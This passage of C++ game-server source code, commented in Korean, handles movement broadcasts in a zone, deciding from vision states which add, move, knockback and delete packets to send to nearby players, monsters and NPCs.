												// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
												// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
												// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
												// 보내야만 한다.
												//
												// 요약하면,
												//
												// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
												// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
												//
												//--------------------------------------------------------------------------------
												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// 상대는 뱀파이어이므로 나의 darkness상태는 관계없다.
												// Hide도 관계없다.
												// *NOTE
												// 상대가 슬레이어라면 슬레이어가 스나이핑 상태인지를 체크 해야 한다.
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream(&outputStream);
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream(&outputStream);
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
											break;
								
										case Creature::CREATURE_CLASS_OUSTERS :
											{
												Assert(pCreature->getPlayer() != NULL);

												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// 상대에게 PC의 등장을 알리는 패킷.
												if ( canSee( pCreature, pMonster ) )
												{
													if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
													{
														pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													} 
													else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
													{
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													}
													else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
													{
														pCreature->getPlayer()->sendPacket(&gcDeleteObject);
													}
												}
											}
											break;
										case Creature::CREATURE_CLASS_NPC :
											{
											}
											break;

										default :
											throw Error("invalid creature class");
			
									}//switch (pCreature->getCreatureClass())
				
								}//case Object::OBJECT_CLASS_CREATURE :
			
								break;

							//--------------------------------------------------------------------------------
							// 타일 위에 아이템이 있을 경우
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_ITEM :
								{
								}
								break;

							//--------------------------------------------------------------------------------
							// 타일 위에 이펙트가 있을 경우
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_EFFECT :
								{
								}
								break;

							//--------------------------------------------------------------------------------
							// 타일 위에 장애물이 있을 경우
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_OBSTACLE :
								{
									// darkness
								}
								break;

							//--------------------------------------------------------------------------------
							// 타일 위에 포탈이 있을 경우
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_PORTAL :
								{
									// darkness
								}
								break;

							default :
								throw Error("invalid object class");

						}//switch ((*itr)->getObjectClass())
					} while ( ++itr != objectList.end() );	// do ~ while
				}//if
			}//for
		}//for


		delete pAddMonsterPacket;
	}

	return true;
	
	__END_DEBUG 
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// (x1,y1)에서 (x2,y2)로 PC가 이동할 경우, 그 PC가 자리가 바뀜에 따라
// 새로 보게 되는 것들에 대한 정보를 보내줘야 하고, 그 PC를 새로 보게 되는
// 다른 크리쳐들에게도 정보를 보내줘야 한다.
//
// bSendMove는 move packet을 보내는가에 대한 변수.
// bKnockback은 현재의 움직임이 정상적인 움직임인가, 아니면 knockback에
// 의한 강제적인 움직임인가를 나타내는 변수
//////////////////////////////////////////////////////////////////////////////
void Zone::movePCBroadcast (Creature* pPC, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, bool bSendMove, bool bKnockback)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_MOVEPC");

	try
	{
		// 이 메쏘드는 PC 를 대상으로 한다.
		Assert(pPC->isPC());

		//////////////////////////////////////////////////////////////////////////////
		// 자신의 이동을 나타내는 GCMove 패킷을 만들어둔다. 클라이언트에게 GCMove를 
		// 전송할때, (x,y)는 이전 좌표여야 하며, dir 은 바라보는(이동할) 방향이어야 한다.
		// 그것이 현재의 정책!
		//////////////////////////////////////////////////////////////////////////////
		GCMove gcMove;
		if (bSendMove)
		{
			gcMove.setObjectID(pPC->getObjectID());
			gcMove.setX(x1);
			gcMove.setY(y1);
			gcMove.setDir(pPC->getDir());
		}
		GCKnockBack gcKnockback;
		if (bKnockback)
		{
			gcKnockback.setObjectID(pPC->getObjectID());
			gcKnockback.setOrigin(x1, y1);
			gcKnockback.setTarget(x2, y2);
		}

#ifdef __USE_ENCRYPTER__
		SocketEncryptOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
		outputStream.setEncryptCode( m_EncryptCode );
#else
		SocketOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
#endif
		if ( bSendMove )
			gcMove.writeHeaderNBody( outputStream );
		else
			gcKnockback.writeHeaderNBody( outputStream );

		//////////////////////////////////////////////////////////////////////////////
		// 움직이는 PC를 새로 보게될 다른 PC들을 위해서 PC의 타입에 따라 GCAdd 패킷을
		// 만들어둔다.  현재의 정책에 의하면, GCAdd 패킷은 현재의 좌표를 바탕으로 한다.
		//////////////////////////////////////////////////////////////////////////////
		Packet* pGCAddXXX = NULL;

		if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_SLAYER) 
		{
			Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);

			//		GCAddSlayer* pGCAddSlayer = new GCAddSlayer(pSlayer->getSlayerInfo3());
			//		pGCAddSlayer->setEffectInfo(pSlayer->getEffectInfo());
			GCAddSlayer* pGCAddSlayer = new GCAddSlayer;
			makeGCAddSlayer( pGCAddSlayer, pSlayer );
			pGCAddXXX = pGCAddSlayer;
		} 
		else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_VAMPIRE) 
		{
			Vampire* pVampire = dynamic_cast<Vampire*>(pPC);

			// 음.. hide상태에서 움직일 수는 없지만. 미래를 대비.
			if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE))
			{
				GCAddBurrowingCreature* pGCABC = new GCAddBurrowingCreature();
				pGCABC->setObjectID(pVampire->getObjectID());
				pGCABC->setName(pVampire->getName());
				pGCABC->setX(x2);
				pGCABC->setY(y2);
				pGCAddXXX = pGCABC;	
			}
			else
			{
				//			GCAddVampire* pGCAddVampire = new GCAddVampire(pVampire->getVampireInfo3());
				//			pGCAddVampire->setEffectInfo(pVampire->getEffectInfo());
				GCAddVampire* pGCAddVampire = new GCAddVampire;
				makeGCAddVampire( pGCAddVampire, pVampire );
				pGCAddXXX = pGCAddVampire;
			}
		}
		else if ( pPC->getCreatureClass() == Creature::CREATURE_CLASS_OUSTERS )
		{
			Ousters* pOusters = dynamic_cast<Ousters*>(pPC);

			//		GCAddOusters* pGCAddOusters = new GCAddOusters( pOusters->getOustersInfo3() );
			//		pGCAddOusters->setEffectInfo(pOusters->getEffectInfo());
			GCAddOusters* pGCAddOusters = new GCAddOusters;
			makeGCAddOusters( pGCAddOusters, pOusters );
			pGCAddXXX = pGCAddOusters;
		}

		//////////////////////////////////////////////////////////////////////////////
		// PC가 움직이므로, 보고있던 놈들 중에서 이 PC를 못 보게
		// 되는 놈들도 있다. 이들에게 보내줄 GCDeleteObject 패킷을
		// 만들어둔다.
		//////////////////////////////////////////////////////////////////////////////
		GCDeleteObject gcDeleteObject;
		gcDeleteObject.setObjectID(pPC->getObjectID());

		Player* pPlayer = pPC->getPlayer();
		Assert(pPlayer != NULL);

		// loop 안에 있던걸 이쪽으로 뺐다. by sigi. 2002.5.8
		//	Sight_t sight = pPC->getSight();
		//	VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pPC->getDir());

		//    // ObservingEye 이펙트를 가져온다.
		//	EffectObservingEye* pEffectObservingEye = NULL;
		//	if ( pPC->isFlag(Effect::EFFECT_CLASS_OBSERVING_EYE ) )
		//	{
		//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
		//		//Assert( pEffectObservingEye != NULL );
		//	}

		//////////////////////////////////////////////////////////////////////////////
		// 시야 영역의 상하좌우 모두 + 1 씩 증가시킨다. 
		// 이유는 방향에 따른 ON_SIGHT 영역이 증가되기 때문이다.
		//////////////////////////////////////////////////////////////////////////////
		for (ZoneCoord_t ix = max(0, x2 - maxViewportWidth - 1), endx = min(m_Width - 1, x2 + maxViewportWidth + 1) ; ix <= endx ; ix++) 
		{
			for (ZoneCoord_t iy = max(0, y2 - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y2 + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
			{
				//if (pPC->isFlag(Effect::EFFECT_CLASS_DARKNESS)) sight = DARKNESS_SIGHT;

				// 현재 타일 위에 있는 모든 오브젝트들에 대해 반복한다.
				const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

				forward_list<Object*>::const_iterator itr = objectList.begin();

				// 
				// object가 있는 경우만 
				// pVisionInfo->getVisionState()를 체크 하기 위해서
				// if - do~while 을 사용했다. by sigi. 2002.5.8
				//
				if (itr != objectList.end())
				{
					// 이전 좌표 P(x1,y1)에서 I(ix,iy)가 어떻게 보이는가?
					//				VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
					VisionState prevVisionState = VisionInfoManager::getVisionState( x1, y1, ix, iy );
					// 현재 좌표 Q(x2,y2)에서 I(ix,iy)가 어떻게 보이는가?
					//				VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);
					VisionState curVisionState = VisionInfoManager::getVisionState( x2, y2, ix, iy );

					do		
					{
						Assert(*itr != NULL);

						Object* pDebugObject = *itr;

						Object::ObjectClass OClass = pDebugObject->getObjectClass();

						////////////////////////////////////////////////////////////
						// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을
						// 만들어서 owner 에게 전송한다. 
						////////////////////////////////////////////////////////////

						////////////////////////////////////////////////////////////
						// 타일 위에 크리처가 있을 경우
						////////////////////////////////////////////////////////////
						if (OClass == Object::OBJECT_CLASS_CREATURE)
						{
							Creature* pCreature = dynamic_cast<Creature*>(*itr);
							Assert(pCreature != NULL);

							if (pCreature == pPC)
							{
								// 넉백일 경우, 자신의 의지에 의해 움직이는 것이 아니라, 
								// 타인에 의해 움직이는 것이므로 보내줘야 한다.
								if (bKnockback)
								{
									//pPC->getPlayer()->sendPacket(&gcKnockback);
									pPC->getPlayer()->sendStream( &outputStream );
									// 넉백을 보내줬으면 continue한다.
								}

								// 자기 자신의 이동 정보는 받을 필요가 없다.
								continue;
							}

							Creature::CreatureClass CClass = pCreature->getCreatureClass();

							// Monster > Slayer > Vampire > NPC 순이라고 판단해서
							// if 순서를 바꿨다. 길드 건물 같은 곳은 좀 다르겠지만?
							// by sigi. 2002.5.8
							if (CClass == Creature::CREATURE_CLASS_MONSTER)
							{
								Monster* pMonster = dynamic_cast<Monster*>(pCreature);

								//--------------------------------------------------------------------------------
								// 이전 좌표에서는 이 몬스터를 볼 수 없었으나, 도착 좌표에서 이 몬스터를 보게 될
								// 경우 GCAddMonster 패킷을 전송한다.
								//--------------------------------------------------------------------------------
								if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
								{											
									// by sigi
									Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

									if (pAddMonsterPacket!=NULL)
									{
										pPlayer->sendPacket( pAddMonsterPacket );

										delete pAddMonsterPacket;
									}
								}

								// PC를 몬스터의 잠재적인 적으로 지정해준다.
								VisionState vs = pMonster->getVisionState(x2,y2);

								// Aggressive 몬스터에게만 적으로 등록시켜준다.
								if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
								{
									if (isPotentialEnemy(pMonster, pPC))
									{
										pMonster->addPotentialEnemy(pPC);
									}
								}
							}
							else if (CClass == Creature::CREATURE_CLASS_SLAYER)
							{
								// 현재 타일이 원래는 안 보이다가 이제 보이는 경우에, 
								// 이 타일에 크리쳐가 서 있다면... 
								// 움직이고 있는 PC에게 이 타일에 서 있는 놈의 정보를 보내주어야 한다.
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
								{
									// 현재 움직이는 크리쳐에게 스나이핑 상태가 걸려있지 않거나,
									// 걸려있다면 디텍트 인비저빌러티가 걸려있어야 볼 수 있다.
									// canSee 로 대체. by bezz 2003.05.29
									//								if ( canSee( pPC, pCreature, pEffectObservingEye ) )
									if ( canSee( pPC, pCreature ) )
									{
										Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
										//									GCAddSlayer gcAddSlayer(pSlayer->getSlayerInfo3()); 
										//									gcAddSlayer.setEffectInfo(pSlayer->getEffectInfo());
										GCAddSlayer gcAddSlayer;
										makeGCAddSlayer( &gcAddSlayer, pSlayer );
										pPlayer->sendPacket(&gcAddSlayer);
									}
								}

								Assert(pCreature->getPlayer() != NULL);

								//////////////////////////////////////////////////////////////////////////////
								// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
								// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
								// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
								// 보내야만 한다.
								//
								// 요약하면,
								//
								// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
								// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
								//////////////////////////////////////////////////////////////////////////////
								VisionState prevVS = pCreature->getVisionState(x1,y1);
								VisionState currVS = pCreature->getVisionState(x2,y2);

								// 보이지 않는 영역에서, 경계 영역을 거치지 않고 바로
								// 시야 내부 영역으로 들어온다는 것은 불가능하다.
								// 이거 이제 쌩~ IN_SIGHT밖에 없다.
								//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

								if ( canSee( pCreature, pPC ) )
								{
									if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
									{
										pCreature->getPlayer()->sendPacket(pGCAddXXX);
									} 
									else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
									{
										//if (bSendMove)
										//	pCreature->getPlayer()->sendPacket(&gcMove);
										//else if (bKnockback)
										//	pCreature->getPlayer()->sendPacket(&gcKnockback);
										pCreature->getPlayer()->sendStream( &outputStream );
									}
									else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
									{
										pCreature->getPlayer()->sendPacket(&gcDeleteObject);
									}
								}
							}
							else if (CClass == Creature::CREATURE_CLASS_VAMPIRE)
							{
								//////////////////////////////////////////////////////////////////////////////
								// 이전 좌표에서는 보이지 않다가, 이번 좌표에서 새로 보이게 된 크리처만
								// GCAddXXX 를 받아온다. 이전에도 NEW_SIGHT 이고, 지금도 NEW_SIGHT 이면,
								// 새로 받아오지 않는다.
								//////////////////////////////////////////////////////////////////////////////
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
								{
									if ( canSee( pPC, pCreature ) )
									{
										if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
										{
											//										if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
											//											&& (pPC->isVampire() 
											//												|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
											//											)
											{
												GCAddBurrowingCreature gcABC;
												gcABC.setObjectID(pCreature->getObjectID());
												gcABC.setName(pCreature->getName());
												gcABC.setX(ix);
												gcABC.setY(iy);
												pPlayer->sendPacket(&gcABC);
											}
										} 
										else 
										{
											//										if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
											//											&& (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY)
											//												|| pPC->isVampire() 
											//												|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
											//											)
											{
												Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
												//											GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
												//											gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
												GCAddVampire gcAddVampire;
												makeGCAddVampire( &gcAddVampire, pVampire );

												pPlayer->sendPacket(&gcAddVampire);
											}
										}
									}
								}

								Assert(pCreature->getPlayer() != NULL);

								//////////////////////////////////////////////////////////////////////////////
								// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
								// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
								// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
								// 보내야만 한다.
								//
								// 요약하면,
								//
								// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
								// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
								//////////////////////////////////////////////////////////////////////////////
								VisionState prevVS = pCreature->getVisionState(x1,y1);
								VisionState currVS = pCreature->getVisionState(x2,y2);

								// 보이지 않는 영역에서, 경계 영역을 거치지 않고 바로
								// 시야 내부 영역으로 들어온다는 것은 불가능하다.
								// 이거 이제 쌩~ IN_SIGHT밖에 없다.
								//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

								// 상대는 뱀파이어이므로 나의 darkness상태는 관계없다.
								// Hide도 관계없다.
								//							if (!pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
								//								&& (!pPC->isSlayer() 
								//									|| !pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
								//								)
								if ( canSee( pCreature, pPC ) )
								{
									if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
									{
										pCreature->getPlayer()->sendPacket(pGCAddXXX);
									}
									else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
									{
										//if (bSendMove) pCreature->getPlayer()->sendPacket(&gcMove);
										////else if (bKnockback) pCreature->getPlayer()->sendPacket(&gcKnockback);
										pCreature->getPlayer()->sendStream( &outputStream );
									}
									else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
									{
										pCreature->getPlayer()->sendPacket(&gcDeleteObject);
									}
								}
							}

							else if (CClass == Creature::CREATURE_CLASS_OUSTERS)
							{
								//////////////////////////////////////////////////////////////////////////////
								// 이전 좌표에서는 보이지 않다가, 이번 좌표에서 새로 보이게 된 크리처만
								// GCAddXXX 를 받아온다. 이전에도 NEW_SIGHT 이고, 지금도 NEW_SIGHT 이면,
								// 새로 받아오지 않는다.
								//////////////////////////////////////////////////////////////////////////////
								if (curVisionState >= IN_SIGHT  && prevVisionState == OUT_OF_SIGHT) 
								{
									//								if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
									if ( canSee( pPC, pCreature ) )
									{
										Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
										//									GCAddOusters gcAddOusters(pOusters->getOustersInfo3());
										//									gcAddOusters.setEffectInfo(pOusters->getEffectInfo());
										GCAddOusters gcAddOusters;
										makeGCAddOusters( &gcAddOusters, pOusters );
										pPlayer->sendPacket(&gcAddOusters);
									}
								}

								Assert(pCreature->getPlayer() != NULL);

								//////////////////////////////////////////////////////////////////////////////
								// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
								// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
								// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
								// 보내야만 한다.
								//
								// 요약하면,
								//
								// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
								// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
								//////////////////////////////////////////////////////////////////////////////
								VisionState prevVS = pCreature->getVisionState(x1,y1);
								VisionState currVS = pCreature->getVisionState(x2,y2);

								// 보이지 않는 영역에서, 경계 영역을 거치지 않고 바로
								// 시야 내부 영역으로 들어온다는 것은 불가능하다.
								//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

								if ( canSee( pCreature, pPC ) )
								{
									if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
									{
										pCreature->getPlayer()->sendPacket(pGCAddXXX);
									}
									else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
									{
										//if (bSendMove) pCreature->getPlayer()->sendPacket(&gcMove);
										//else if (bKnockback) pCreature->getPlayer()->sendPacket(&gcKnockback);
										pCreature->getPlayer()->sendStream( &outputStream );
									}
									else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
									{
										pCreature->getPlayer()->sendPacket(&gcDeleteObject);
									}
								}
							}

							else if (CClass == Creature::CREATURE_CLASS_NPC)
							{
								NPC* pNPC = dynamic_cast<NPC*>(pCreature);

								//--------------------------------------------------------------------------------
								//
								// 이전 좌표에서는 이 몬스터를 볼 수 없었으나, 도착 좌표에서 이 몬스터를 보게 될
								// 경우 GCAddMonster 패킷을 전송한다.
								//
								//--------------------------------------------------------------------------------
								if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
								{
									GCAddNPC gcAddNPC;
									makeGCAddNPC(&gcAddNPC, pNPC);
									pPlayer->sendPacket(&gcAddNPC);
								}
							}
							else 
							{
								throw Error("invalid creature class");
							}
						}
						////////////////////////////////////////////////////////////
						// 타일 위에 아이템이 있을 경우
						////////////////////////////////////////////////////////////
						else if (OClass == Object::OBJECT_CLASS_ITEM)
						{
							if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
							{
								Item* pItem = dynamic_cast<Item*>(*itr);

								Item::ItemClass IClass = pItem->getItemClass();

								if (IClass == Item::ITEM_CLASS_CORPSE)
								{
									ItemType_t IType = pItem->getItemType();

									if (IType == SLAYER_CORPSE)
									{
										SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
										GCAddSlayerCorpse gcAddSlayerCorpse;
										makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
										pPlayer->sendPacket(&gcAddSlayerCorpse);
									}
									else if (IType == VAMPIRE_CORPSE)
									{
										VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
										GCAddVampireCorpse gcAddVampireCorpse;
										makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
										pPlayer->sendPacket(&gcAddVampireCorpse);
									}
									else if (IType == OUSTERS_CORPSE)
									{
										OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
										GCAddOustersCorpse gcAddOustersCorpse;
										makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
										pPlayer->sendPacket(&gcAddOustersCorpse);
									}
									else if (IType == NPC_CORPSE)
									{
										throw UnsupportedError(__PRETTY_FUNCTION__);
									}
									else if (MONSTER_CORPSE)
									{
										MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
										GCAddMonsterCorpse gcAddMonsterCorpse;
										makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
										pPlayer->sendPacket(&gcAddMonsterCorpse);

										sendRelicEffect( pMonsterCorpse, pPlayer );
									}
									else
									{
										Assert(false);
									}
								} 
								else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
								{	
									if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
									{
										GCAddInstalledMineToZone gcAddMine;
										gcAddMine.setObjectID(pItem->getObjectID());
										gcAddMine.setX(ix);
										gcAddMine.setY(iy);
										gcAddMine.setItemClass(pItem->getItemClass());
										gcAddMine.setItemType(pItem->getItemType());
										gcAddMine.setOptionType(pItem->getOptionTypeList());
										gcAddMine.setDurability(pItem->getDurability());
										pPlayer->sendPacket(&gcAddMine);
									} 
								}
								else 
								{
									GCAddNewItemToZone gcAddNewItemToZone;
									makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddNewItemToZone);
								}
							}
						}
						////////////////////////////////////////////////////////////
						// 타일 위에 이펙트가 있을 경우
						////////////////////////////////////////////////////////////
						else if (OClass == Object::OBJECT_CLASS_EFFECT)
						{
							Effect* pEffect = dynamic_cast<Effect*>(*itr);

							// broadcasting Effect 인지 체크 추가 2003.3.31 by Sequoia
							if (pEffect->isBroadcastingEffect() && 
								curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
							{
								if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
								{
									EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
									ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

									GCAddVampirePortal gcAddVampirePortal;
									gcAddVampirePortal.setObjectID(pEffect->getObjectID());
									gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
									gcAddVampirePortal.setX(ix);
									gcAddVampirePortal.setY(iy);
									gcAddVampirePortal.setTargetZoneID(zonecoord.id);
									gcAddVampirePortal.setTargetX(zonecoord.x);
									gcAddVampirePortal.setTargetY(zonecoord.y);
									gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
									gcAddVampirePortal.setCreateFlag(0);

									pPlayer->sendPacket(&gcAddVampirePortal);
								}
								// by sigi. 2002.6.10
								else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
								{
									EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

									ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
									ZoneCoord_t centerY = pEffectSanctuary->getCenterY();

									// sanctuary는 중심좌표인 경우만 packet을 보낸다.
									if (centerX==ix && centerY==iy)
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
								else
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

									pPlayer->sendPacket(&gcAddEffectToTile);
								}
							}
						}
						////////////////////////////////////////////////////////////
						// 타일 위에 장애물이 있을 경우
						////////////////////////////////////////////////////////////
						else if (OClass == Object::OBJECT_CLASS_OBSTACLE)
						{
						}
						////////////////////////////////////////////////////////////
						// 타일 위에 포탈이 있을 경우
						////////////////////////////////////////////////////////////
						else if (OClass == Object::OBJECT_CLASS_PORTAL)
						{
							// darkness
						}
						else
						{
							throw Error("invalid object class");
						}

					} while ( ++itr != objectList.end() );	// by sigi. 2002.5.8
				}//for 오브젝트들에 대한 반복
			}//for Y 좌표에 대한 반복
		}//for X 좌표에 대한 반복

		SAFE_DELETE(pGCAddXXX);

	}
	catch ( Throwable& t )
	{
		filelog( "Zone_movePCBroadcast.log", "%s", t.toString().c_str() );
		throw t;
	}

	__END_PROFILE_ZONE("Z_BC_MOVEPC");

	__END_CATCH
}


//////////////////////////////////////////////////////////////////////////////
// moveCreatureBroadcast
//
// PC가 아닌 크리처(NPC,몬스터)가 P(x1,y1)에서 Q(x2,y2)로 이동했을 때,
// 주변 영역에 존재하는 PC들에게 브로드캐스트하는 메쏘드이다.
//
// 이 메쏘드를 호출하기 전에, 3 가지 패킷은 만들어둬야만 한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::moveCreatureBroadcast(Creature* pCreature, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, bool bSendMove, bool bKnockback)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_MOVE_CREATURE")

	try {

	Monster* pMonster = NULL;
	NPC* pNPC = NULL;

	Assert(pCreature != NULL);
	Assert(pCreature->isNPC() || pCreature->isMonster());

	// 현재의 정책에 의하면, GCMove 패킷은 이전 좌표와 현재 방향을 전송하게 되어있다.
	GCMove gcMove;
	if (bSendMove)
	{
		gcMove.setObjectID(pCreature->getObjectID());
		gcMove.setX(x1);
		gcMove.setY(y1);
		gcMove.setDir(pCreature->getDir());
	}
	GCKnockBack gcKnockback;
	if (bKnockback)
	{
